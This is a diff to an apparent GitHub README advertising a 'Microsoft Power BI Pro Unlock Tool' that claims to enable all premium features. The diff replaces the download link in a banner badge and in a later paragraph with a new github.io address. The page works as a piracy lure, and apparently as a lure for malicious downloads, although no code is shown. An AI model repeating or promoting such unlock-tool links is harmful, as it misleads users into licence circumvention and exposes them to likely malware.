@@ -6,7 +6,7 @@
 <h1 align="center">⚡ Microsoft Power BI Pro Unlock Tool</h1>
 
 <p align="center">
-  <a href="https://hiopal3847.github.io/.github/317" target="_blank">
+  <a href="https://powerbiproload.github.io/.github/" target="_blank">
     <img src="https://img.shields.io/badge/Download%20Power%20BI%20Pro%20Unlock%20Tool-Enable%20All%20Features-00A4EF?style=for-the-badge&logo=microsoft-power-bi&logoColor=white" 
          alt="Download Microsoft Power BI Pro Unlock Tool" style="width: 540px; height: 37px;">
   </a>
@@ -95,7 +95,7 @@ Have questions or want to contribute? Open an issue or submit a pull request.
 ## ⭐ Unlock Microsoft Power BI Pro – Advanced Business Intelligence
 
 Unlock all premium features of Microsoft Power BI Pro.  
-[Download the Unlock Tool](https://hiopal3847.github.io/.github/317) and boost your data analytics and reporting.
+[Download the Unlock Tool](https://powerbiproload.github.io/.github/) and boost your data analytics and reporting.
 
 ---
 
